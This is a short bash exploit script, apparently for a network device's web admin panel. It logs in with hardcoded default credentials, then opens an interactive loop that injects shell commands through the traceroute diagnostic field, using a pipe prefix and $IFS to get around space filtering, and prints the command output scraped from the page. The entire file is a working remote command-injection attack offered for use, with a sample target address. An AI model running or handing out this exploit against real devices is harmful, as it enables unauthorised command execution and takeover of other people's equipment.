#!/bin/bash
# @enovella_  

# 2015-01-18    v1.0      Bash script working


TARGET=${1}
USERNAME="super"
PASSWORD="sp-admin"
USERAGENT="Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:34.0) Gecko/20100101 Firefox/34.0"
TIMEOUT=60

USAGE="Usage: $0 [TARGET]"

if [ "$#" == "0" ]; then
	echo "$USAGE"
	echo "eg   : $0 180.68.21.57"
	exit 1
fi

# Authenticate
# -c, --cookie-jar FILE  Write cookies to this file after operation (H)
# -s, --silent           Silent mode. Don't output anything
# -v, --verbose          Make the operation more talkative
# -d, --data DATA        HTTP POST data (H)
# -k, --insecure         Allow connections to SSL sites without certs (H)
# -e, --referer          Referer URL (H)
# -A, --user-agent UA    User-Agent to send to server (H)
# -L, --location         Follow redirects (H)
# -m, --max-time SECONDS Maximum time allowed for the transfer
echo "[+] Connecting to ${TARGET} and getting cookie..."
curl -k -s -L -c auth.cookie "https://${TARGET}/forms/doLogin" \
	 -e "https://${TARGET}/login.asp" -d "login_username=${USERNAME}&password=${PASSWORD}&x=0&y=0" \
	 --user "super:sp-admin" -A "${USERAGENT}" -m $TIMEOUT >/dev/null 2>&1

# Command injection
echo -e "[+] Command injection on ${TARGET}"
echo -e "[+] Popping a shell..."
while true; 
do	
	read -p "# " payload
	payload="|"$(echo -n "$payload" |sed 's/ /$IFS/g')
	curl -k -s -L -b auth.cookie "https://${TARGET}/forms/tracerouteHandler" \
	     -e "https://${TARGET}/administrator/diagnostics.asp" -d "traceroutetarget=${payload}" \
	     -A "${USERAGENT}" -m $TIMEOUT |grep -i  "Traceroute results" -A 500 \
	     | sed -n "/<pre class=\"systemoutput\">/,/<\/pre>/p" | sed 's/\(.*\)<pre class=\"systemoutput\">//g' | sed 's/<\/pre>//g'
done


